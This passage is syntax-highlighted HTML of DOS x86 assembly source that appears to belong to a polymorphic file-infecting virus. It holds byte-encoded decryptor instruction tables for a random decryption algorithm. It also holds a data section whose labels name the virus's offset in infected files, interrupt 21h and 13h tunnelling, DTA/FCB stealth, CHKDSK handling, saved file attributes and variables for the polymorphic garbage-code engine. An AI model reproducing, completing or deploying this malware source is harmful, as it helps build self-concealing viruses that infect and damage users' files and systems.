        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">12h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">rda_from_table_part_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">33h</span><span class="sc0"> </span><span class="sc1">; xor dx,ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">; add bp,ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2Bh</span><span class="sc0"> </span><span class="sc1">; sub dx,ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">33h</span><span class="sc0"> </span><span class="sc1">; xor bp,ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">; add dx,ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">33h</span><span class="sc0"> </span><span class="sc1">; xor bp,dx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">33h</span><span class="sc0"> </span><span class="sc1">; xor dx,ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2Bh</span><span class="sc0"> </span><span class="sc1">; sub bp,ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">33h</span><span class="sc0"> </span><span class="sc1">; xor dx,ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">33h</span><span class="sc0"> </span><span class="sc1">; xor bp,ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">; add dx,ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2Bh</span><span class="sc0"> </span><span class="sc1">; sub bp,ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">; add dx,ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">33h</span><span class="sc0"> </span><span class="sc1">; xor bp,ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">33h</span><span class="sc0"> </span><span class="sc1">; xor dx,ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2Bh</span><span class="sc0"> </span><span class="sc1">; sub bp,ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">rda_from_table_part_1_end</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">rda_from_table_part_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">31h</span><span class="sc0"> </span><span class="sc1">; xor [bx],dx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">17h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D3h</span><span class="sc0"> </span><span class="sc1">; ror word ptr [bx],cl</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Fh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D3h</span><span class="sc0"> </span><span class="sc1">; rol word ptr [bx],cl</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">29h</span><span class="sc0"> </span><span class="sc1">; sub [bx],dx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">17h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; add [bx],dx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">17h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F7h</span><span class="sc0"> </span><span class="sc1">; neg word ptr [bx]</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1Fh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F7h</span><span class="sc0"> </span><span class="sc1">; not word ptr [bx]</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">17h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0"> </span><span class="sc1">; inc word ptr [bx]</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0"> </span><span class="sc1">; dec word ptr [bx]</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Fh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D1h</span><span class="sc0"> </span><span class="sc1">; ror word ptr [bx],1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Fh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D1h</span><span class="sc0"> </span><span class="sc1">; rol word ptr [bx],1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D1h</span><span class="sc0"> </span><span class="sc1">; ror word ptr [bx],1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Fh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D1h</span><span class="sc0"> </span><span class="sc1">; rol word ptr [bx],1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0"> </span><span class="sc1">; inc word ptr [bx]</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0"> </span><span class="sc1">; dec word ptr [bx]</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Fh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F7h</span><span class="sc0"> </span><span class="sc1">; not word ptr [bx]</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">17h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F7h</span><span class="sc0"> </span><span class="sc1">; neg word ptr [bx]</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1Fh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">29h</span><span class="sc0"> </span><span class="sc1">; sub [bx],dx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">17h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; add [bx],dx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">17h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D3h</span><span class="sc0"> </span><span class="sc1">; ror word ptr [bx],cl</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Fh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D3h</span><span class="sc0"> </span><span class="sc1">; rol word ptr [bx],cl</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">31h</span><span class="sc0"> </span><span class="sc1">; xor [bx],dx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">17h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">rda_from_table_part_2_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">first_data</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">second_data</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">code_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">cache_stat</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Status of disk cache</span><span class="sc0">
</span><span class="sc5">int21_addr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Address of interrupt 21h</span><span class="sc0">
</span><span class="sc5">int08_addr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Address of interrupt 08h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">tunnel_addr</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Address of tunneled interrupt</span><span class="sc0">
</span><span class="sc5">tun_exit_off</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Offset of tunneled interrupt exit</span><span class="sc0">
</span><span class="sc5">sp_</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Stack pointer</span><span class="sc0">
</span><span class="sc5">tun_int_stat</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Status of the tunneled interrupt</span><span class="sc0">
</span><span class="sc5">tunnel_stat</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Status of tunneling</span><span class="sc0">
</span><span class="sc5">int21_addr_</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Address of interrupt 21h</span><span class="sc0">
</span><span class="sc5">int13_addr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Address of interrupt 13h</span><span class="sc0">
</span><span class="sc5">tun_i13_stat</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Status of tunneling interrupt 13h</span><span class="sc0">
</span><span class="sc5">virus_offset</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">  </span><span class="sc1">; Offset of virus within infected ....</span><span class="sc0">
</span><span class="sc5">file_header_</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1ah</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; File header</span><span class="sc0">
</span><span class="sc5">int01_addr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Address of interrupt 01h</span><span class="sc0">
</span><span class="sc5">int03_addr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Address of interrupt 03h</span><span class="sc0">
</span><span class="sc5">int2a_addr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Address of interrupt 2ah</span><span class="sc0">
</span><span class="sc5">int13_addr_</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Address of interrupt 13h</span><span class="sc0">
</span><span class="sc5">int24_addr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Address of interrupt 24h</span><span class="sc0">
</span><span class="sc5">int21_addr__</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Address of interrupt 21h</span><span class="sc0">
</span><span class="sc5">int01_addr_</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Address of interrupt 01h</span><span class="sc0">
</span><span class="sc5">all_regs_initial_pnt</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; all regs are initialized at this</span><span class="sc0">
                    </span><span class="sc1">; point</span><span class="sc0">
</span><span class="sc5">file_attr</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; File attributes</span><span class="sc0">
</span><span class="sc5">file_date</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; File's date</span><span class="sc0">
</span><span class="sc5">file_time</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; File's time</span><span class="sc0">
</span><span class="sc5">using_8_bits_register</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">register_compat</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; for byte and for word</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">garbage_register</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; register to be used</span><span class="sc0">
</span><span class="sc5">garbage_word_byte</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; 00h byte, 01h word</span><span class="sc0">
</span><span class="sc5">mops_tmptable</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; math ops generated (ref to</span><span class="sc0">
                        </span><span class="sc1">; the table)</span><span class="sc0">
</span><span class="sc5">rda_garbage_limits</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; limit the garbage in the rda steps</span><span class="sc0">
                    </span><span class="sc1">; to some given classes</span><span class="sc0">
</span><span class="sc5">poly_reg_di</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">layer_di_pointer</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; value of DI, destination for code</span><span class="sc0">
                    </span><span class="sc1">; generation for this layer</span><span class="sc0">
</span><span class="sc5">poly_actual_layer</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; number of layer actually building</span><span class="sc0">
</span><span class="sc5">poly_layer_nr</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; number of layers to create</span><span class="sc0">
</span><span class="sc5">pointer_direction</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">tipo_register</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">counter_direction</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">counter_register</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">pointer_register</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">restrict_grb_ax_is_used</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; 01h restrict since ax is used</span><span class="sc0">
                    </span><span class="sc1">; 00h can create all kinda grg almost</span><span class="sc0">
</span><span class="sc5">layer_sp_pointer</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; value of SP of this layer, that is</span><span class="sc0">
                    </span><span class="sc1">; pointer to the layer data on stack</span><span class="sc0">
</span><span class="sc5">howmany_from_used_table</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">poly_reg_si</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">poly_total_lenght</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">poly_reg_cx</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; body lenght for poly, initial CX</span><span class="sc0">
</span><span class="sc5">poly_reg_bx</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">pointer_assign_pos</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; where the pointer is assigned</span><span class="sc0">
</span><span class="sc5">counter_assign_pos</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; where the counter is assigned</span><span class="sc0">
</span><span class="sc5">garbage_instr_number</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">counter_check_pos</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; where the comparation for the loop</span><span class="sc0">
                    </span><span class="sc1">; exit is done</span><span class="sc0">
</span><span class="sc5">dec_loop_begin_pos</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; pointer to begin of dec loop</span><span class="sc0">
</span><span class="sc5">pointer_to_end_after_rda_2</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">rda_add_to_lenght_rnd</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">pnt_to_end_after_rda</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; pointer to end of everything after</span><span class="sc0">
                    </span><span class="sc1">; the rda execution</span><span class="sc0">
</span><span class="sc5">dec_loop_end_pos</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; pointer to end of dec loop</span><span class="sc0">
</span><span class="sc5">decryptor_ended_inmem_pnt</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; to the end of decryptor in mem</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">create_or_just_read</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">math_seq_stack_off</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">filesize</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">        </span><span class="sc10">?</span><span class="sc0">         </span><span class="sc1">; Filesize</span><span class="sc0">
</span><span class="sc5">reloca_entry</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">        </span><span class="sc10">?</span><span class="sc0">         </span><span class="sc1">; Relocation entry</span><span class="sc0">
</span><span class="sc5">pointer_to_used_table</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; for the routine that gets a pointer</span><span class="sc0">
                    </span><span class="sc1">; to a table as a parameter</span><span class="sc0">
</span><span class="sc5">grb_jump_place</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; offset where to put jump, used for</span><span class="sc0">
                    </span><span class="sc1">; garbage generation</span><span class="sc0">
</span><span class="sc5">end_most_internal_layer</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; pointer to the end of the most</span><span class="sc0">
                    </span><span class="sc1">; internal layer in mem</span><span class="sc0">
</span><span class="sc5">dumb_cntr_ass</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">ss__</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Stack segment (SS)</span><span class="sc0">
</span><span class="sc5">sp__</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Stack pointer (SP)</span><span class="sc0">
</span><span class="sc5">chkdsk_stat</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Status of CHKDSK.EXE</span><span class="sc0">
</span><span class="sc5">filesize_</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Filesize</span><span class="sc0">
</span><span class="sc5">filenam_addr</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Address of filename</span><span class="sc0">
</span><span class="sc5">dta_fcb_stat</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Status of DTA or FCB stealth</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; Filename</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">05h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">rda_address_buffer</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc1">; the adresses of each generated step</span><span class="sc0">
                    </span><span class="sc1">; will be inserted after this point</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">27fh</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">ecc_temp_buffer</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">data_buffer</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">5abfh</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">stack_ptr</span><span class="sc4">:</span><span class="sc0">
